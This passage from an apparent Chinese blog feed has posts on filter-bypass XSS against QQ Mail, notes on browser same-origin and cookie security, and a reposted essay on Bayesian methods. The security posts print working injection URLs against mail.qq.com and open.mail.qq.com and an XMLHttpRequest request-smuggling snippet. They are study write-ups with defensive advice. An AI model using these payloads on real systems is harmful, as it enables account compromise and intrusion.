<p>有一点点机会突破，但是后边的语法就太奇怪了，有语法错误了。肿么办，我们在试试正斜杠，发现也没有被屏蔽，perfect，我们用正斜杠来讲后边直接注释掉，让语法正常。</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">location.href=<span class="string">"........."</span>+<span class="string">"&ss=aaaa\"+"</span>&from=<span class="number">1</span><span class="comment">//"+"&param=";</span></div></pre></td></tr></table></figure>

<p>但是还有一个问题，&amp; 在这里，被考虑成了一个与操作，优先级是高于 =号的，变成了(“字符串”&amp;from)=1 的语法，这仍然是错误的。但是，如果我们再测试一下，= 号会不会被屏蔽呢，=号也可以用，那么我们改变一下语法，添加一个等号，变成 ==：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">location.href=<span class="string">"........."</span>+<span class="string">"&ss=aaaa\"+"</span>&from==<span class="number">1</span><span class="comment">//"+"&param=";</span></div></pre></td></tr></table></figure>

<p>于是语法编程了(“string”)&amp;(from==1)的样式，from 变成了一个bool操作，但现在又面临了新的问题，如果你在URL 里本来该是一个定义的操作，却变成了一个判断的操作，from 就变成了未定义的状态了，语法仍然会报错，这我们就要进一步理解JavaScript的语法了，如果我们把from 当做一个变量或者是方法，如果是方法，无论在何处定义，都会被拉到最简便，所以我们在from 的部分再添加一个步骤：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">location.href=<span class="string">"........."</span>+<span class="string">"&ss=aaaa\"+"</span>&from==<span class="number">1</span>;<span class="function"><span class="keyword">function</span> <span class="title">from</span><span class="params">()</span></span>{}<span class="comment">//"+"&param=";</span></div></pre></td></tr></table></figure>

<p>这样，from 就不会被当成是未定义的了，但问题又来了，我们现在添加了许多东西，而添加的这些东西，包含了许多特殊字符，会不会通过呢，经过实际测试，还真是悲剧了，空格符被转义了：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-14-14632360553284.jpg" alt=""></p>
<p>空格符被转义了怎么办呢，我们找到新的替换品，那就是/**/, 这是一个注释符，之前我们也测试过了，斜杠不会被过滤，那么这个注释符，成功的顶替了空格，形成了正常的语法。</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">location.href=<span class="string">"........."</span>+<span class="string">"&ss=aaaa\"+"</span>&from==<span class="number">1</span>;<span class="function"><span class="keyword">function</span>/**/<span class="title">from</span><span class="params">()</span></span>{}<span class="comment">//"+"&param=";</span></div></pre></td></tr></table></figure>

<p>从语法上看，这样就OK 了，我们的攻击代码可以放function 的前边，直接用alert(/xss/)；测试，最终代码：<br><a href="http://mail.qq.com/cgi-bin/login?vt=passport&amp;ss=\&amp;from==0;alert(1);function/**/from(){};//&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%25252Fcgi-bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526clickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1" target="_blank" rel="external">http://mail.qq.com/cgi-bin/login?vt=passport&amp;ss=\&amp;from==0;alert(1);function/**/from(){};//&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%25252Fcgi-bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526clickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1</a></p>
<p>结果毫无疑问弹了窗。</p>
<p>那么回到源头去搜索整个注入的过程，我们发现，注入的过程，颇有几分SQL 的风采，都是利用各种语法上的技巧，在我们的SQL注入中，一些常见的技巧，比如基于重言式，这和XSS 的试图闭合语法相似，比如联合查询法，试图借助未转义的字符，来完成注入。</p>
<p>这个漏洞的挖掘过程，就是从一个狭小的入口进入，借助了字符过滤不完整的漏洞，挖开了深层的内容。所以，在实际编程开发中，对特殊字符的控制，是需要慎之又慎的，一旦有一个小小的漏洞，就会被随时攻破。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="XSSer_升级之路">XSSer 升级之路</h1>
<p>之前积累了XSS 有一段时间，因为目前开始了一件有趣的工程，需要整合非常多的知识，其中Web 安全这一块出现最多的，应该就是XSS，SQL注入了，再加上乌云泡着看别人的文章，看各家大网站的漏洞，决定把这]]>
    </summary>
    
      <category term="TCP/IP" scheme="http://yoursite.com/tags/TCP-IP/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[内容隔离逻辑 -- 《The Tangled Web》]]></title>
    <link href="http://yoursite.com/2016/05/11/%E5%86%85%E5%AE%B9%E9%9A%94%E7%A6%BB%E9%80%BB%E8%BE%91-%E3%80%8AThe-Tangled-Web%E3%80%8B/"/>
    <id>http://yoursite.com/2016/05/11/内容隔离逻辑-《The-Tangled-Web》/</id>
    <published>2016-05-11T08:48:45.000Z</published>
    <updated>2016-05-11T08:52:15.000Z</updated>
    <content type="html"><![CDATA[<h1 id="内容隔离逻辑">内容隔离逻辑</h1>
<p>在最开始，阐述浏览器安全的时候，我们提到了浏览器的隔离措施，虽然浏览器试图通过内容隔离逻辑，来保证不同源的文件之间访问的控制，但是这样的策略仍然是非完全安全的，从这一部分开始，我们就开始探讨关于Web应用，特别是浏览器的各种安全特性。</p>
<h2 id="DOM_同源策略">DOM 同源策略</h2>
<p>同源策略Same-Origin Policy 其实规则非常直接：<strong>除非JavaScript所处的两个页面的协议，DNS域名，端口完全一致，否则两个独立的JavaScript运行环境不能访问彼此的DOM</strong>，其他任何跨域文档JavaScript DOM 访问都会失败。</p>
<p>这个同源策略看起来非常易于理解，但其中包含的问题也不少。</p>
<p>首先是DNS，这里的问题是，浏览器在判断同源的时候，只对DNS域名进行判断，而非IP地址，假如某个特定主机的IP地址发生了变化，就有可能造成漏洞产生，这种攻击行为叫做DNS 重绑定攻击。</p>
<p>我们再看这个URL，浏览器代码里包含有多套独立的URL 解析处理，如果HTTP 堆栈里对源的解析和JavaScript对源的判断产生了误差，就可能导致问题。在各种浏览器中，有可能产生不少由于URL 刻意变形导致的SOP 绕过漏洞。</p>
<p>同时对于IE浏览器早期版本，甚至在做同源检查的时候，可能会忽略端口，后果可想而知。</p>
<p>同源策略在一开始只是针对DOM 的，但是后来这个策略逐渐扩散到了保护从JavaScript的根对象开始的其他敏感数据。不过<strong>非同源的脚本还是可以这任意窗口或者框架使用location.assign(), location.replace()</strong></p>
<p>同时，同源策略还存在一些障碍，比如无法隔离本来属于两个用户的网页（因为无法给每个用户单独分配域名），另一种情况，这个策略也会使得原本合法的同站点域名不能无缝交换数据。比如login.exp.com 和 payment.exp.com。当然，修复的方法广泛支持的是document.domain 和 postMessage()。</p>
<p><strong>document.domain</strong></p>
<p>javaScript 通过设置document.domain 来覆盖同源检查策略中的主机名匹配，不过只是允许具有相同顶级域名，比如exp.com 甚至是 .com。赋值形式如下：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.domain = <span class="string">"exp.com"</span></div></pre></td></tr></table></figure>

<p>但需要注意的是，一个设置了document.domain 的页面是不能访问一个没有设置的页面，这样有可能造成本来是同源的页面，反而变成了隔离，虽然有时候有人试图使用这条规则，或者是给两个同源页面设置不同的document.domain，但实际上这种伪隔离域仍然支持对另一个设定进行 javascript:URL 跳转动作。</p>
<p>另外，由于场景不清晰，本来只是打算让两个页面同源，但此时会招来另一个页面，通过设置domain 一样能够同源，这样，实际上就是告诉我们，设置domain,实际上是将整个域的安全，交给了整个域中最不安全的那一个了。</p>
<p><strong>postMessage(…)</strong></p>
<p>postMessage()方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递。</p>
<p>postMessage(data,origin)方法接受两个参数:</p>
<ol>
<li>data:要传递的数据，html5规范中提到该参数可以是JavaScript的任意基本类型或可复制的对象，然而并不是所有浏览器都做到了这点儿，部分浏览器只能处理字符串参数，所以我们在传递参数的时候需要使用JSON.stringify()方法对对象参数序列化，在低版本IE中引用json2.js可以实现类似效果。</li>
<li>origin：字符串参数，指明目标窗口的源，协议+主机+端口号[+URL]，URL会被忽略，所以可以不写，这个参数是为了安全考虑，postMessage()方法只会将message传递给指定窗口，当然如果愿意也可以建参数设置为”*”，这样可以传递给任意窗口，如果要指定和当前窗口同源的话设置为”/“。</li>
</ol>
<p>考虑一下场景，在payments.exp.com 的根路径 下有两个页面，需要把用户登录信息显示在该页面上。为达到这个目的，payments.exp.com 这个页面加载一个纸箱login.exp.com 的子框架。这个子框架发送以下指令：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">parent.postMessage(<span class="string">"user=bob"</span>, <span class="string">"https://payment.exp.com"</span>)</div></pre></td></tr></table></figure>

<p>只有当payment.exp.com 确认是指定的信任源，浏览器才会发送postMessage 消息出于根路径下的接收方也需要确认消息的正确性，这样就确保了整个机制的健壮。</p>
<p><strong>与浏览器身份验证的交互</strong></p>
<p>在了解完DOM 相关的同源策略后，我们应当记住<strong>同源策略无法和全局身份认证，SSL 状态，网络上下文环境，以及众多浏览器管理涉及安全的其他参数同步</strong>。这里有一个很绕的例子：</p>
<p>某站点的登陆表单有CSRF 的漏洞，攻击者首先在框架里嵌入目标此网站上的一个敏感页面，然后诱使受害者登录到该站一个由攻击者控制的账号里，然后执行目标网站其他应用上的跨站攻击。进入HTTP 的身份验证信息已经改变了，但是后一个步骤里的代码注入却会对之前加载的子框架具有完全的访问权限，也会导致数据被窃取。这是一个很绕的攻击过程，不过不难理解，正是由于DOM 的同源和这些身份认证，状态等信息无法同步的原因造成的。</p>
<h2 id="XMLHttpRequest_同源策略">XMLHttpRequest 同源策略</h2>
<p>XMLHttpRequest 对象用于在后台与服务器交换数据。</p>
<ul>
<li>在不重新加载页面的情况下更新网页</li>
<li>在页面已加载后从服务器请求数据</li>
<li>在页面已加载后从服务器接收数据</li>
<li>在后台向服务器发送数据</li>
<li>所有现代的浏览器都支持 XMLHttpRequest 对象。</li>
</ul>
<p>而这个机制的关键是他会用到浏览器的HTTP 堆栈及其组件，包括全局身份认证，缓存机制，持续会话等。XMLHttpRequest 的同源机制，和浏览器的默认同源机制差不多，不过因一点点不同，比如XMLHttpRequest.open（）里设定的目标URL 地址必须与发起的页面完全同源。</p>
<p>用户对于发送的请求头域有绝对的控制，其优点就是，通过插入一些自定义的请求头，可以确认特定的请求来源。但是问题就是<strong>插入某些请求头则可能对目标服务器端或者代理服务器的解析产生影响</strong>，比如设定错误的Content-Length 可能导致攻击者在原该浏览器维护的HTTP 持续会话里偷偷加入第二个请求。</p>
<p>考虑下面的代码：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">x.open(<span class="string">"POST"</span>, <span class="string">"http://www.exp.com"</span>,<span class="literal">false</span>);</div><div class="line"><span class="comment">// 下边会替换掉自动记录出来的长度</span></div><div class="line">x.setRequestHeader(<span class="string">"Content-Length"</span>, <span class="string">"7"</span>);</div><div class="line"><span class="comment">// 当长度超过之后，会截断，剩下的，会被认为是第二个独立的请求。</span></div><div class="line">x.send(</div><div class="line">    <span class="string">"Gotcha!\n"</span>+</div><div class="line">    <span class="string">"GET /evil.html HTTP/1.1\n"</span>+</div><div class="line">    <span class="string">"HOST: www.unnyoulet.com\n\n"</span></div></pre></td></tr></table></figure>

<p>一般，面对这种风险的方式，就是，设置一个黑名单，比如Content-Length, Host, Referer ，而对譬如User-Agent,Cookie, Origin ， If-Modified-Since 的处理却各有不同。</p>
<h2 id="Web_Storage_同源">Web Storage 同源</h2>
<p>Web Storage 是浏览器中实现的一个简单的数据存储功能，目前有两个JavaScript对象， localStorage , sessionStorage。前者是可以进行持久存储的，后者则是绑定当前浏览器，提供临时的缓存机制。</p>
<h2 id="Cookie_安全策略">Cookie 安全策略</h2>
<p>Cookie 的默认有效范围是域名，但是并没有办法吧Cookie 范围限制在单个主机名上，可以吧Cookie 里的Domain 设置为当前主机名上，但实际上访问该主机名的子域名，也会认为是有效的。</p>
<p>所以就形成了一个有意思的现象，当我们完全不设置domain 的时候，反而在某些浏览器上会将Cookie 的范围局限在主机名之内，但对IE 来说确实无效的。<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-11-14629533767415.jpg" alt=""></p>
<p>那么如何有效的设置范围呢，cookie 中使用的是path. 只有请求的路径与cookie 的path 参数吻合，才会发送cookie。</p>
<p>但实际上，无论cookie 如何设定，对于同源策略来说，是不会检查URL 路径的，JS 代码还是可以随意访问同意主机上的不同URL，那么cookie 的path实际上不能作为有效的安全边界。</p>
<p>另外还有两个标记，分别是httponly，secure 。前者通过设置，可以禁止document.cookie 访问页面的cookie, 后者则要求cookie 不能用于非加密通道。</p>
<p>这么看起来稳妥了很多，然而还是有问题的，<strong>因为这可以防止数据不被读取，但是无法防止不被覆盖</strong>，通过js代码，我们可以使某域名对应的Cookie 池发生溢出，然后设置新的不带secure 的cookie 。对此的解决办法是，将cookie 池内容隔离，分为Httponly cookie 和普通的cookie,但是如果cookie 允许名字相同，在碰到匹配请求的时候，这些cookie 会被浏览器一起发送。</p>
<p>如此，我们可以看到，cookie和同源机制实际上是会相互影响到的，比如前边提到的同源机制影响了cookie 的路径范围机制，而另一方面讲，cookie 更加严重的影响了同源策略，因为cookie 经常被用作身份认证信息，如果cookie信息被获取，就相当于绕过了同源策略。</p>
<p><strong>域名限制的问题</strong></p>
<p>由于Cookie 的有效范围设置，容易造成安全问题，那么避免cookie 的域名错误，就是需要解决的问题。目前支持的方法是，数点号的个数。一般化的要求是，<strong>只有处于具体域名的主机名范围内，才能设置该域名对应的Cookie, 这个域名包括至少2个或3个点号，才能避免出现诸如.com .edu vas.us 这样的形式</strong>，特别的，对于域名属于7种特定格式的定居于明，那么需要包含2个点，除此之外则是3个点，但问题在于域名设置各式各样，比如有.com， .com.cn 但还可以直接.cn ，所以浏览器们基本上都是使用了各自的的过滤方法来处理，但是，如今域名的形式越来越多，相信cookie 的这一机制也面临各种挑战。</p>
<p><strong>Cookie 与 合法DNS 劫持</strong></p>
<p>这个实际上在中国非常广泛，运营社对于不存在的域名，会返回其广告页。那如果这个看起来非常破的广告页，如果存在漏洞，那么利用漏洞，可以获得任意域的上下文环境执行权限。</p>
<h2 id="安全工程">安全工程</h2>
<ul>
<li>对全部站点都要使用可靠地安全策略，为保护用户，应该在最顶层的crossdomain.xml 文件设定permitted-cross-domain-policies 参数项为master-only 或者是by-content-type ，实际这个站点没有用的Flash,这样做可以组织由攻击者控制的无关内容被错误的当做另一个crossdomain.xml 文件，对同源策略产生影响。</li>
<li>当依赖HTTP cookies 来作身份验证时<ul>
<li>使用httponly 标签，不要让JavaScript 直接访问到身份授权的cookie 信息，对于敏感的cookie 的有效范围越小越好，或者是不设置domain。</li>
<li>如果应用基于https, 那么cookie 标记为secure， 同时防止cookie 被注入。</li>
</ul>
</li>
<li>处理JavaScript 跨域通信的时候<ul>
<li>不要是document.domain， 尽量使用postMessage(), 以此来确保目标源的设置是正确的，对于域名的判断不要直接使用简单的截断匹配方式: msg.origin.indexOf(“.exp.com”)</li>
<li>小心postMessage() 绕过的方法。</li>
</ul>
</li>
</ul>
<hr>
<p>内容隔离是浏览器为Web 安全竖起的一道长城，然而由于 Web 本身的种种特点，造成了这个长城有非常多的漏洞，能够让长城两端以各种形式自由出入，这里边，关于插件部分，被我跳过了，主要是因为这一块比较陌生。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="内容隔离逻辑">内容隔离逻辑</h1>
<p>在最开始，阐述浏览器安全的时候，我们提到了浏览器的隔离措施，虽然浏览器试图通过内容隔离逻辑，来保证不同源的文件之间访问的控制，但是这样的策略仍然是非完全安全的，从这一部分开始，我们就开始探讨关于Web应用，特别是浏览器]]>
    </summary>
    
      <category term="TCP/IP" scheme="http://yoursite.com/tags/TCP-IP/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[(level 4)离奇的宽字节 -- XSS升级之路]]></title>
    <link href="http://yoursite.com/2016/05/10/-level-4-%E7%A6%BB%E5%A5%87%E7%9A%84%E5%AE%BD%E5%AD%97%E8%8A%82-XSS%E5%8D%87%E7%BA%A7%E4%B9%8B%E8%B7%AF/"/>
    <id>http://yoursite.com/2016/05/10/-level-4-离奇的宽字节-XSS升级之路/</id>
    <published>2016-05-10T14:56:51.000Z</published>
    <updated>2016-05-10T14:58:51.000Z</updated>
    <content type="html"><![CDATA[<h1 id="level_4_离奇的宽字节">level 4 离奇的宽字节</h1>
<p>搞过SQL 注入的，应该是比较了解宽字节注入的，由于某些SQL 注入的核心是提前出线单引号来闭合前边的输入，然后在后边可以插入别的语句，联合查询等等。所以比较一般的过滤方式是将单引号转义，加一个斜杠。但此时忽略了编码的神奇。如果开发者在设置编码支持的时候，如果选择了GBK，gb18030,utf-8 等方式，实际上是支持十六位编码的。</p>
<p>最常见的方式，也就是在url里，在引号%27 或者是 %22 之前，加入%df, 由于0xdf 对应的大于128，所以，解析器会认为他和后边的组成了16位的编码，就会吃掉后边的字符，而后边跟着的字符，又恰恰是我们给引号添加的斜杠，%5c,于是%df 就会吃掉%5c 合并成一个字，引号重新暴露。</p>
<p>这种方法在XSS 不常见，但是如果某些XSS 在写过滤规则的时候，如果处理不当，还是有可能出现宽字节注入的情况，考虑如下url:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&t=%22;alert(1);//aaaaaa</div></pre></td></tr></table></figure>

<p>此处双引号被过滤了，变成了&amp;quot ;，如下：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-10-14628903722866.jpg" alt=""></p>
<p>如果我们尝试一下采用宽字节注入，考虑构造成如图所示：<br>zh_CN&amp;t=%c0%22;alert(1);</p>
<p>令人惊奇的是，这次注入成功了，观察代码如图：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-10-14628904952071.jpg" alt=""></p>
<p>当然，此处所遇到的问题，应该并不是前边提到的传统的形式，%c0 吃掉%5c ,因为很明显，此处没有使用斜杠转义，而是转成了&amp;quot ; 只能把原因归咎于正则表达式处理的问题。</p>
<p>我们看到，即使当以注意到了问题所在的时候，仍然可能犯错误，而且是以意想不到的方式犯错，黑客渗透的方式，可能会以所有意想不到的形式进行。</p>
<p>我们将防御性代码比做成安全的城墙，那么正则过滤引擎，应该是这座安全长城的第一站，而在《Web 之困》 一书中，作者也说过，要想试图过滤掉所有的危险的编码，这几乎是不可能完成的任务。但作为开发者，比黑客再多想一些，这是应该的。</p>
<p>在XSS 界，拥有各种各样的形式去变形构造，在owasp 里，这篇<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="external">XSS Filter Evasion Cheat Sheet</a> 详细介绍了各种变形，以期能穷尽目前已知的各种变形手段，下次，我会对其中的变性手段，进行总结。但是，你想要过滤这所有的变形手段，几乎是不可能的，即使你过滤了他们，而引擎本身出现的错误，又会创造新的漏洞，上述例子就是这样的。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="level_4_离奇的宽字节">level 4 离奇的宽字节</h1>
<p>搞过SQL 注入的，应该是比较了解宽字节注入的，由于某些SQL 注入的核心是提前出线单引号来闭合前边的输入，然后在后边可以插入别的语句，联合查询等等。所以比较一般的过滤方式是将单引号转义]]>
    </summary>
    
      <category term="TCP/IP" scheme="http://yoursite.com/tags/TCP-IP/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[平凡又神奇的贝叶斯方法]]></title>
    <link href="http://yoursite.com/2016/05/07/%E5%B9%B3%E5%87%A1%E5%8F%88%E7%A5%9E%E5%A5%87%E7%9A%84%E8%B4%9D%E5%8F%B6%E6%96%AF%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2016/05/07/平凡又神奇的贝叶斯方法/</id>
    <published>2016-05-07T14:22:03.000Z</published>
    <updated>2016-05-07T14:24:46.000Z</updated>
    <content type="html"><![CDATA[<h1 id="平凡而又神奇的贝叶斯方法">平凡而又神奇的贝叶斯方法</h1>
<p>偶然又看到有人推荐刘未鹏《暗时间》这篇文章，几年前看这文章的时候，没接触机器学习，对其感触不是很深，就觉得对贝叶斯解释的非常到位。现在有一些数据挖掘基础之后，再看一遍，还是感觉收获巨大，把很多地方在本质上串联到了一起，这里再发一遍，表示对刘未鹏大神的敬佩。</p>
<h2 id="转载自刘未鹏博客">转载自<a href="http://mindhacks.cn/2008/09/21/the-magical-bayesian-method/" target="_blank" rel="external">刘未鹏博客</a></h2>
<p>概率论只不过是把常识用数学公式表达了出来。</p>
<p>——拉普拉斯</p>
<p>记得读本科的时候，最喜欢到城里的计算机书店里面去闲逛，一逛就是好几个小时；有一次，在书店看到一本书，名叫贝叶斯方法。当时数学系的课程还没有学到概率统计。我心想，一个方法能够专门写出一本书来，肯定很牛逼。后来，我发现当初的那个朴素归纳推理成立了——这果然是个牛逼的方法。</p>
<p>——题记</p>
<h1 id="前言">前言</h1>
<p>这是一篇关于贝叶斯方法的科普文，我会尽量少用公式，多用平白的语言叙述，多举实际例子。更严格的公式和计算我会在相应的地方注明参考资料。贝叶斯方法被证明是非常 general 且强大的推理框架，文中你会看到很多有趣的应用。</p>
<h1 id="历史">历史</h1>
<p>托马斯·贝叶斯（Thomas Bayes）同学的详细生平在这里。以下摘一段 wikipedia 上的简介：</p>
<blockquote>
<p>所谓的贝叶斯方法源于他生前为解决一个“逆概”问题写的一篇文章，而这篇文章是在他死后才由他的一位朋友发表出来的。在贝叶斯写这篇文章之前，人们已经能够计算“正向概率”，如“假设袋子里面有N个白球，M个黑球，你伸手进去摸一把，摸出黑球的概率是多大”。而一个自然而然的问题是反过来：“如果我们事先并不知道袋子里面黑白球的比例，而是闭着眼睛摸出一个（或好几个）球，观察这些取出来的球的颜色之后，那么我们可以就此对袋子里面的黑白球的比例作出什么样的推测”。这个问题，就是所谓的逆概问题。</p>
</blockquote>
<p>实际上，贝叶斯当时的论文只是对这个问题的一个直接的求解尝试，并不清楚他当时是不是已经意识到这里面包含着的深刻的思想。然而后来，贝叶斯方法席卷了概率论，并将应用延伸到各个问题领域，所有需要作出概率预测的地方都可以见到贝叶斯方法的影子，特别地，贝叶斯是机器学习的核心方法之一。这背后的深刻原因在于，现实世界本身就是不确定的，人类的观察能力是有局限性的（否则有很大一部分科学就没有必要做了——设想我们能够直接观察到电子的运行，还需要对原子模型争吵不休吗？），我们日常所观察到的只是事物表面上的结果，沿用刚才那个袋子里面取球的比方，我们往往只能知道从里面取出来的球是什么颜色，而并不能直接看到袋子里面实际的情况。这个时候，我们就需要提供一个猜测（hypothesis，更为严格的说法是“假设”，这里用“猜测”更通俗易懂一点），所谓猜测，当然就是不确定的（很可能有好多种乃至无数种猜测都能满足目前的观测），<strong>但也绝对不是两眼一抹黑瞎蒙——具体地说，我们需要做两件事情：1. 算出各种不同猜测的可能性大小。2. 算出最靠谱的猜测是什么。第一个就是计算特定猜测的后验概率，对于连续的猜测空间则是计算猜测的概率密度函数。第二个则是所谓的模型比较，模型比较如果不考虑先验概率的话就是最大似然方法。</strong></p>
<h2 id="1-1_一个例子：自然语言的二义性">1.1 一个例子：自然语言的二义性</h2>
<p>下面举一个自然语言的不确定性的例子。当你看到这句话：</p>
<blockquote>
<p>The girl saw the boy with a telescope.</p>
</blockquote>
<p>你对这句话的含义有什么猜测？平常人肯定会说：那个女孩拿望远镜看见了那个男孩（即你对这个句子背后的实际语法结构的猜测是：The girl saw-with-a-telescope the boy ）。然而，仔细一想，你会发现这个句子完全可以解释成：那个女孩看见了那个拿着望远镜的男孩（即：The girl saw the-boy-with-a-telescope ）。那为什么平常生活中我们每个人都能够迅速地对这种二义性进行消解呢？这背后到底隐藏着什么样的思维法则？我们留到后面解释。</p>
<h2 id="1-2_贝叶斯公式">1.2 贝叶斯公式</h2>
<p>贝叶斯公式是怎么来的？</p>
<p>我们还是使用 wikipedia 上的一个例子：</p>
<blockquote>
<p>一所学校里面有 60% 的男生，40% 的女生。男生总是穿长裤，女生则一半穿长裤一半穿裙子。有了这些信息之后我们可以容易地计算“随机选取一个学生，他（她）穿长裤的概率和穿裙子的概率是多大”，这个就是前面说的“正向概率”的计算。然而，假设你走在校园中，迎面走来一个穿长裤的学生（很不幸的是你高度近似，你只看得见他（她）穿的是否长裤，而无法确定他（她）的性别），你能够推断出他（她）是男生的概率是多大吗？</p>
</blockquote>
<p>一些认知科学的研究表明（《决策与判断》以及《Rationality for Mortals》第12章：小孩也可以解决贝叶斯问题），我们对形式化的贝叶斯问题不擅长，但对于以频率形式呈现的等价问题却很擅长。在这里，我们不妨把问题重新叙述成：你在校园里面随机游走，遇到了 N 个穿长裤的人（仍然假设你无法直接观察到他们的性别），问这 N 个人里面有多少个女生多少个男生。</p>
<p>你说，这还不简单：算出学校里面有多少穿长裤的，然后在这些人里面再算出有多少女生，不就行了？</p>
<p>我们来算一算：假设学校里面人的总数是 U 个。60% 的男生都穿长裤，于是我们得到了 U <em> P(Boy) </em> P(Pants|Boy) 个穿长裤的（男生）（其中 P(Boy) 是男生的概率 = 60%，这里可以简单的理解为男生的比例；P(Pants|Boy) 是条件概率，即在 Boy 这个条件下穿长裤的概率是多大，这里是 100% ，因为所有男生都穿长裤）。40% 的女生里面又有一半（50%）是穿长裤的，于是我们又得到了 U <em> P(Girl) </em> P(Pants|Girl) 个穿长裤的（女生）。加起来一共是 U <em> P(Boy) </em> P(Pants|Boy) + U <em> P(Girl) </em> P(Pants|Girl) 个穿长裤的，其中有 U <em> P(Girl) </em> P(Pants|Girl) 个女生。两者一比就是你要求的答案。</p>
<p>下面我们把这个答案形式化一下：我们要求的是 P(Girl|Pants) （穿长裤的人里面有多少女生），我们计算的结果是 U <em> P(Girl) </em> P(Pants|Girl) / [U <em> P(Boy) </em> P(Pants|Boy) + U <em> P(Girl) </em> P(Pants|Girl)] 。容易发现这里校园内人的总数是无关的，可以消去。于是得到</p>
<p><strong>P(Girl|Pants) = P(Girl) <em> P(Pants|Girl) / [P(Boy) </em> P(Pants|Boy) + P(Girl) * P(Pants|Girl)]</strong></p>
<p>注意，如果把上式收缩起来，分母其实就是 P(Pants) ，分子其实就是 P(Pants, Girl) 。而这个比例很自然地就读作：在穿长裤的人（ P(Pants) ）里面有多少（穿长裤）的女孩（ P(Pants, Girl) ）。</p>
<p>上式中的 Pants 和 Boy/Girl 可以指代一切东西，所以其一般形式就是：</p>
<p><strong>P(B|A) = P(A|B) <em> P(B) / [P(A|B) </em> P(B) + P(A|~B) * P(~B) ]</strong></p>
<p>收缩起来就是：</p>
<p><strong>P(B|A) = P(AB) / P(A)</strong></p>
<p>其实这个就等于：</p>
<p><strong>P(B|A) * P(A) = P(AB)</strong></p>
<p>难怪拉普拉斯说概率论只是把常识用数学公式表达了出来。</p>
<p>然而，后面我们会逐渐发现，看似这么平凡的贝叶斯公式，背后却隐含着非常深刻的原理。</p>
<h1 id="2-_拼写纠正">2. 拼写纠正</h1>
<p>经典著作《人工智能：现代方法》的作者之一 Peter Norvig 曾经写过一篇介绍如何写一个拼写检查/纠正器的文章（原文在这里，徐宥的翻译版在这里，这篇文章很深入浅出，强烈建议读一读），里面用到的就是贝叶斯方法，这里我们不打算复述他写的文章，而是简要地将其核心思想介绍一下。</p>
<p>首先，我们需要询问的是：“问题是什么？”</p>
<p>问题是我们看到用户输入了一个不在字典中的单词，我们需要去猜测：“这个家伙到底真正想输入的单词是什么呢？”用刚才我们形式化的语言来叙述就是，我们需要求：</p>
<p><strong>P(我们猜测他想输入的单词 | 他实际输入的单词)</strong></p>
<p>这个概率。并找出那个使得这个概率最大的猜测单词。显然，我们的猜测未必是唯一的，就像前面举的那个自然语言的歧义性的例子一样；这里，比如用户输入： thew ，那么他到底是想输入 the ，还是想输入 thaw ？到底哪个猜测可能性更大呢？幸运的是我们可以用贝叶斯公式来直接出它们各自的概率，我们不妨将我们的多个猜测记为 h1 h2 .. （ h 代表 hypothesis），它们都属于一个有限且离散的猜测空间 H （单词总共就那么多而已），将用户实际输入的单词记为 D （ D 代表 Data ，即观测数据），于是</p>
<p><strong>P(我们的猜测1 | 他实际输入的单词)</strong></p>
<p>可以抽象地记为：</p>
<p><strong>P(h1 | D)</strong></p>
<p>类似地，对于我们的猜测2，则是 P(h2 | D)。不妨统一记为：</p>
<p><strong>P(h | D)</strong></p>
<p>运用一次贝叶斯公式，我们得到：</p>
<p><strong>P(h | D) = P(h) * P(D | h) / P(D)</strong></p>
<p>对于不同的具体猜测 h1 h2 h3 .. ，P(D) 都是一样的，所以在比较 P(h1 | D) 和 P(h2 | D) 的时候我们可以忽略这个常数。即我们只需要知道：</p>
<p>P(h | D) ∝ P(h) * P(D | h) （注：那个符号的意思是“正比例于”，不是无穷大，注意符号右端是有一个小缺口的。）</p>
